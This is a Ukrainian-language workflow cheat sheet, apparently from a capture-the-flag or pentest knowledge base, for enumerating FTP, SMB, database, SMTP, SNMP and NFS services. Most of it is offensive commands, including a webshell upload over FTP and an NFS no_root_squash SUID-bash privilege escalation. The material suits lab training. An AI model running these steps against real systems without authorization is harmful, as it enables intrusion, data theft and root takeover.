# Workflow: Service Enumeration (не-веб сервіси)

**Для чого:** витягнути максимум з FTP/SSH/SMB/БД та інших сервісів.
**Коли:** nmap показав відповідні порти.
← [recon](../01-roadmaps/recon.md) · [smb cheatsheet](../03-cheatsheets/smb-enum.md) · [credential-hunting](credential-hunting.md)

---

## <a id="ftp"></a>FTP (21)
```bash
nmap -p21 --script ftp-anon,ftp-syst $TARGET          # анонімний доступ?
# завантажити ВСЕ анонімно одним рухом (дзеркало):
wget -m --no-passive ftp://anonymous:anonymous@$TARGET/   # або -m ftp://... якщо passive
# вручну:
ftp $TARGET                                            # anonymous / anonymous
#   binary ; prompt off ; mget *          -- забрати все
#   get config.php ; get backup.zip        -- конкретні файли
# залити webshell (якщо є запис і FTP = веб-корінь):
#   put shell.php                          -- далі http://$TARGET/shell.php?c=id
```
Цікаве: анонімний вхід, завантажувані конфіги/бекапи/ключі, права на upload (→ webshell, якщо FTP=веб-корінь). Зразки прапорців: `ftp_an0n_r3adm3`, `ftp_h1dd3n_d0tf1l3`.

## SSH (22)
Без кредів — глухо (брут цілі лише помірно; **брут платформи заборонений**).
Повернення сюди з кредами/ключами з інших сервісів → [lateral-movement](lateral-movement.md).
```bash
ssh user@$TARGET
ssh -i id_rsa user@$TARGET          # знайдений ключ (chmod 600 id_rsa)
```

## <a id="smb"></a>SMB (139/445)
```bash
nmap -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users $TARGET
netexec smb $TARGET -u '' -p ''           # null session
netexec smb $TARGET --shares -u '' -p ''
smbclient -L //$TARGET/ -N                # список шар
smbclient //$TARGET/<share> -N            # зайти; get/mget файли
smbmap -H $TARGET -u '' -p ''             # права на шари
enum4linux-ng -A $TARGET                  # повний enum (юзери, шари, політики)
```
Цікаве: читабельні шари, список юзерів (→ spraying), конфіги/скрипти у шарах.
→ деталі: [smb cheatsheet](../03-cheatsheets/smb-enum.md)

## <a id="бази-даних"></a>Бази даних
```bash
mysql -h $TARGET -u root -p                # root без/з простим паролем
psql -h $TARGET -U postgres                # PostgreSQL 5432
redis-cli -h $TARGET                        # Redis 6379 (часто без автентифікації)
# > INFO ; KEYS * ; GET <key>
mongosh --host $TARGET                       # MongoDB 27017: show dbs; use <db>; db.<col>.find()
```
Усередині БД: `SHOW DATABASES; USE x; SHOW TABLES; SELECT * FROM users;` — креди, нотатки, **прапорці** (зразки `sql_r0w_b1ll1ng`, `sql1_un10n_dump`).
→ повний enum/дамп/файли/RCE по рушіях (MySQL/Postgres/MSSQL/Redis/Mongo): [databases cheatsheet](../03-cheatsheets/databases.md).

## SMTP / POP3 / IMAP (25 / 110 / 143)
```bash
nc -nv $TARGET 25                                   # banner
# перебір юзерів через VRFY (валідні юзери → spraying/SSH):
for u in root admin www-data test backup; do echo "VRFY $u" | nc -w1 $TARGET 25; done
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
# читати пошту з кредами (POP3):
nc -nv $TARGET 110      #  USER bob  /  PASS pass  /  LIST  /  RETR 1
```

## SNMP (161/UDP) — часто витік конфігів/процесів
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET   # підібрати community
snmpwalk -v2c -c public $TARGET                                       # усе дерево (community 'public')
snmp-check $TARGET -c public                                         # зведено (юзери/процеси/мережа)
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2               # процеси (паролі в cmdline!)
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25               # Windows-юзери
```

## NFS (2049)
```bash
showmount -e $TARGET                                 # експортовані шари
sudo mkdir -p /mnt/nfs && sudo mount -t nfs $TARGET:/export /mnt/nfs -o nolock
ls -la /mnt/nfs                                      # читати файли/прапорці/ключі
# no_root_squash → створити SUID-бінар локально від root і запустити на цілі:
#   (локально root) cp /bin/bash /mnt/nfs/b; chmod +s /mnt/nfs/b
#   (на цілі)        /export/b -p
```

## Веб-порти (3000/5000/8000/8080…)
Це веб-додаток → [web-enum](web-enum.md).

## Загальний принцип
Для кожного сервісу: (1) banner/версія → `searchsploit`; (2) anon/default creds; (3) читабельні файли/дані; (4) список юзерів для перевірки кредів деінде.
Усе → findings-tracker.
